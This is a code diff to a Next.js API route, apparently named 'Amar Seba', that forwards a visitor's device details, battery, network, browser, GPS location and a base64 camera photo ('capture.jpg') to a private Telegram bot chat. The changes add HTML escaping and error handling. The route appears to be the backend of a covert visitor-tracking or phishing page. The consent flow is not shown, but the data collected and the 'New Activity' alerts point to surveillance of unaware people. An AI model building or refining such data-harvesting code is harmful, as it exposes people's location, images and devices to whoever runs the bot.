@@ -11,46 +11,82 @@ export async function POST(req: Request) {
       return NextResponse.json({ error: 'Telegram configuration missing' }, { status: 500 });
     }
 
+    // Helper to escape HTML special characters
+    const escapeHTML = (text: string) => {
+      if (!text) return '';
+      return text.replace(/[&<>"']/g, (m) => {
+        switch (m) {
+          case '&': return '&amp;';
+          case '<': return '&lt;';
+          case '>': return '&gt;';
+          case '"': return '&quot;';
+          case "'": return '&#039;';
+          default: return m;
+        }
+      });
+    };
+
     // Prepare info message
     const infoMessage = `
-💓 *Amar Seba - New Activity*
+<b>💓 Amar Seba - New Activity</b>
 -------------------------
-📱 *Device:* ${deviceName || 'Unknown'}
-🔋 *Battery:* ${battery}%
-📶 *Network:* ${networkType || 'Unknown'}
-🖥️ *Screen:* ${screenRes || 'Unknown'}
-🌐 *Browser:* ${browser || 'Unknown'}
-☀️ *Display Brightness:* ${brightness || 100}%
-📍 *Location:* ${lat && lng ? `https://www.google.com/maps?q=${lat},${lng}` : 'Not available'}
+📱 <b>Device:</b> ${escapeHTML(deviceName || 'Unknown')}
+🔋 <b>Battery:</b> ${battery}%
+📶 <b>Network:</b> ${escapeHTML(networkType || 'Unknown')}
+🖥️ <b>Screen:</b> ${escapeHTML(screenRes || 'Unknown')}
+🌐 <b>Browser:</b> ${escapeHTML(browser || 'Unknown')}
+☀️ <b>Display Brightness:</b> ${brightness || 100}%
+📍 <b>Location:</b> ${lat && lng ? `<a href="https://www.google.com/maps?q=${lat},${lng}">Google Maps</a>` : 'Not available'}
 -------------------------
-💬 *User Msg:* ${message || 'No message'}
+💬 <b>User Msg:</b> ${escapeHTML(message || 'No message')}
     `;
 
     // 1. Send Text Info
-    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+    const textRes = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         chat_id: chatId,
         text: infoMessage,
-        parse_mode: 'Markdown',
+        parse_mode: 'HTML',
       }),
     });
 
+    if (!textRes.ok) {
+      const errorText = await textRes.text();
+      console.error('Telegram sendMessage failed:', errorText);
+      return NextResponse.json({ error: `Telegram sendMessage failed: ${textRes.statusText}` }, { status: 502 });
+    }
+
     // 2. Send Photo if available
     if (photo) {
-      // Photo comes as base64 data URL: data:image/jpeg;base64,...
-      const base64Data = photo.split(',')[1];
-      const blob = await (await fetch(photo)).blob();
-      
-      const formData = new FormData();
-      formData.append('chat_id', chatId);
-      formData.append('photo', blob, 'capture.jpg');
+      try {
+        // Decode base64 to binary to avoid fetch(dataURL) issues
+        const base64Parts = photo.split(',');
+        const mime = base64Parts[0].match(/:(.*?);/)?.[1] || 'image/jpeg';
+        const binary = atob(base64Parts[1]);
+        const array = new Uint8Array(binary.length);
+        for (let i = 0; i < binary.length; i++) {
+          array[i] = binary.charCodeAt(i);
+        }
+        const blob = new Blob([array], { type: mime });
+        
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('photo', blob, 'capture.jpg');
 
-      await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-        method: 'POST',
-        body: formData,
-      });
+        const photoRes = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+          method: 'POST',
+          body: formData,
+        });
+
+        if (!photoRes.ok) {
+          const photoErr = await photoRes.text();
+          console.error('Telegram sendPhoto failed:', photoErr);
+        }
+      } catch (photoEx) {
+        console.error('Error processing photo for Telegram:', photoEx);
+      }
     }
 
     return NextResponse.json({ success: true });
